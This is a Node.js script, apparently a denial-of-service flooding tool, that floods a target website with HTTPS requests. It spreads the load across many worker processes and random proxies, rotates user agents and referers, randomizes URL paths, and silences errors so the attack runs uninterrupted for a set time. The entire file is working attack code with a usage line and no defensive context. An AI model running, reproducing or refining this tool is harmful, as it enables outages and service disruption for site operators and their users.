const url = require('url'),
fs = require('fs'),
{
    constants
} = require('crypto'),
http = require('http'),
tls = require('tls'),
cluster = require('cluster'),
path = require('path'),
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).setMaxListeners(0);

// node otters.js url time threads method httpversion ref-list ua-list proxy-list

if(process.argv.length < 10) {
    console.log(`use : node ${path.basename(__filename)} url time threads method httpversion ref-list ua-list proxy-list`)
    process.exit(-1)
}

const target = process.argv[2],
time = process.argv[3],
threads = process.argv[4],
method = process.argv[5],
httpversion = process.argv[6],
reflist = process.argv[7],
ualist = process.argv[8],
proxylist = process.argv[9],
referers = fs.readFileSync(reflist,'utf-8').split('\n'),
useragents = fs.readFileSync(ualist,'utf-8').split('\n'),
proxis = fs.readFileSync(proxylist,'utf-8').toString().match(/\S+/g);

function proxys() {
    return proxis[Math.floor(Math.random() * proxis.length)]
}

function referering() {
    return referers[Math.floor(Math.random() * referers.length)]
}

function useragent() {
    return useragents[Math.floor(Math.random() * useragents.length)]
}


setTimeout(() => {
    process.exit(-1)
}, time * 1000)

function RandomString(length){
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ){
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
  return result;
}

if(cluster.isMaster){

    for(let z = 0;z<threads;z++){
        cluster.fork().send({})
    }

}else{

    var parsed = url.parse(target)

    function BuildRequest() {
        let path = parsed.path;
        if (path.indexOf("[rand]") !== -1){
            path = path.replace(/\[rand\]/g,RandomString(14));
        }
        
        var raw_socket = `${method} `+
            path+
            ' HTTP/1.2\r\nHost: '+parsed.host+'\r\nReferer: '+
            target+'\r\nOrigin: '+
            target+
            '\r\nAccept: */*\r\nuser-agent: '+
            useragent() +
            '\r\nUpgrade-Insecure-Requests: 1\r\n'+
            'Accept-Encoding: *\r\n'+
            'Accept-Language: en-US,en;q=0.9\r\n'+
            'Cache-Control: max-age=0\r\n'+
            'Connection: Keep-Alive\r\n\r\n';
        return raw_socket;
    }


    setInterval(function() {
        
        var proxy = proxys()
        proxy = proxy.split(':');
        
        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 50000,
            maxSockets: Infinity,
        });
                
        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host+':443'
        }, function(){ 
            req.setSocketKeepAlive(true);
        });
        
        req.on('connect', function (res, socket, head) {//open raw request
            tls.authorized = true;
            tls.sync = true;
            var TlsConnection = tls.connect({
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                secureProtocol: ['TLSv1_2_method','TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
                honorCipherOrder: true,
                requestCert: true,
                host: parsed.host,
                port: 80,
                secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
                servername: parsed.host,
                secure: true,
                rejectUnauthorized: false,
                socket: socket
            }, function () {
        
                for (let j = 0; j < 32; j++) {
                
                    TlsConnection.setKeepAlive(true, 10000)
                    TlsConnection.setTimeout(10000);
                    var r = BuildRequest();
                    TlsConnection.write(r);
                }   
            });
        
            TlsConnection.on('disconnected', () => {
                TlsConnection.destroy();
            });

            TlsConnection.on('timeout' , () => {
                TlsConnection.destroy();
            });

            TlsConnection.on('error', (err) =>{
                TlsConnection.destroy();
            });

            TlsConnection.on('data', (chunk) => {
                setTimeout(function () { 
                    TlsConnection.destroy(); 
                    return delete TlsConnection
                }, 10000); 
            });
        
            TlsConnection.on('end', () => {
              TlsConnection.destroy();
            });
        
        }).end()
    }, 0);
}

